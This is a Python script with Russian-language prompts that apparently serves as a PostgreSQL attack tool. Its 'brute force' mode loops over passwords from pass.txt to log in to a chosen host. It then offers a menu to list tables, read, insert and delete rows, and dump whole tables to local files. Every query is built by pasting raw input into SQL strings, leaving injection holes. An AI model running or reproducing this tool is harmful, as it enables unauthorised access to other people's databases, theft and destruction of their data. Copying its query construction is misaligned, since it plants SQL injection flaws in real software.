import subprocess
import sys
import os
import psycopg2

def manual_input_psql():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 5432): ")
    if not port:
        port = "5432"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    schema = input("Введите имя схемы (оставьте пустым для схемы по умолчанию 'public'): ")
    if not schema:
        schema = "public"
    password = input("Введите пароль: ")
    
    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            database=database
        )
        print("Успешное подключение к базе данных PostgreSQL")
        psql_menu(conn, schema)
    except Exception as e:
        print(f"Ошибка при подключении к базе данных: {e}")

def psql_menu(conn, schema):
    while True:
        print("\nВыберите действие:")
        print("1. Показать таблицы")
        print("2. Выбрать данные из таблицы")
        print("3. Добавить данные в таблицу")
        print("4. Удалить данные из таблицы")
        print("5. Скачать данные в текстовый файл")
        print("6. Выход")
        choice = input("Введите номер действия: ")
        
        if choice == "1":
            show_tables(conn, schema)
        elif choice == "2":
            select_data(conn, schema)
        elif choice == "3":
            insert_data(conn, schema)
        elif choice == "4":
            delete_data(conn, schema)
        elif choice == "5":
            download_data(conn, schema)
        elif choice == "6":
            print("Выход из меню PostgreSQL")
            break
        else:
            print("Неверный выбор. Пожалуйста, выберите действие от 1 до 6.")

def show_tables(conn, schema):
    cursor = conn.cursor()
    cursor.execute(f"""
        SELECT table_name 
        FROM information_schema.tables 
        WHERE table_schema = '{schema}'
    """)
    tables = cursor.fetchall()
    print(f"\nТаблицы в схеме '{schema}':")
    for table in tables:
        print(table[0])
    cursor.close()

def select_data(conn, schema):
    table_name = input("Введите имя таблицы: ")
    limit = input("Введите лимит строк (оставьте пустым для вывода всех строк): ")
    if not limit:
        limit = "ALL"
    else:
        limit = int(limit)
    
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM {schema}.{table_name} LIMIT {limit}")
    rows = cursor.fetchall()
    colnames = [desc[0] for desc in cursor.description]
    
    print(f"\nДанные из таблицы {schema}.{table_name}:")
    print(colnames)
    for row in rows:
        print(row)
    cursor.close()

def insert_data(conn, schema):
    table_name = input("Введите имя таблицы: ")
    columns = input("Введите имена столбцов через запятую: ")
    values = input("Введите значения через запятую: ")
    
    cursor = conn.cursor()
    cursor.execute(f"INSERT INTO {schema}.{table_name} ({columns}) VALUES ({values})")
    conn.commit()
    print("Данные успешно добавлены")
    cursor.close()

def delete_data(conn, schema):
    table_name = input("Введите имя таблицы: ")
    condition = input("Введите условие для удаления (например, id=1): ")
    
    cursor = conn.cursor()
    cursor.execute(f"DELETE FROM {schema}.{table_name} WHERE {condition}")
    conn.commit()
    print("Данные успешно удалены")
    cursor.close()

def download_data(conn, schema):
    table_name = input("Введите имя таблицы: ")
    file_format = input("Введите формат файла (txt или csv): ")
    file_name = f"{schema}_{table_name}.{file_format}"
    
    cursor = conn.cursor()
    cursor.execute(f"SELECT * FROM {schema}.{table_name}")
    rows = cursor.fetchall()
    colnames = [desc[0] for desc in cursor.description]
    
    with open(file_name, 'w') as f:
        if file_format == "csv":
            f.write(",".join(colnames) + "\n")
            for row in rows:
                f.write(",".join(map(str, row)) + "\n")
        else:
            f.write("\t".join(colnames) + "\n")
            for row in rows:
                f.write("\t".join(map(str, row)) + "\n")
    
    print(f"Данные успешно сохранены в файл {file_name}")
    cursor.close()

def bruteforce_psql():
    host = input("Введите доменное имя или IP-адрес: ")
    port = input("Введите порт (оставьте пустым для порта по умолчанию 5432): ")
    if not port:
        port = "5432"
    username = input("Введите имя пользователя: ")
    database = input("Введите имя базы данных: ")
    schema = input("Введите имя схемы (оставьте пустым для схемы по умолчанию 'public'): ")
    if not schema:
        schema = "public"
    
    with open("pass.txt", "r") as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"Пробуем пароль: {password}")
        
        try:
            conn = psycopg2.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                database=database
            )
            print(f"Успешный вход! Пароль: {password}")
            psql_menu(conn, schema)
            return  # Останавливаем брутфорс, если пароль верный
        except Exception as e:
            print(f"Неверный пароль или другая ошибка: {e}")

def main_menu():
    print("1. Подключение к PostgreSQL (psql)")
    print("2. Брутфорс пароля")
    choice = input("Выберите опцию (1 или 2): ")
    
    if choice == "1":
        manual_input_psql()
    elif choice == "2":
        bruteforce_psql()
    else:
        print("Неверный выбор. Пожалуйста, выберите 1 или 2.")
        main_menu()

if __name__ == "__main__":
    try:
        import psycopg2
    except ImportError:
        print("Ошибка: модуль psycopg2 не установлен. Пожалуйста, установите его с помощью 'pip install psycopg2'.")
        sys.exit(1)
    
    main_menu()
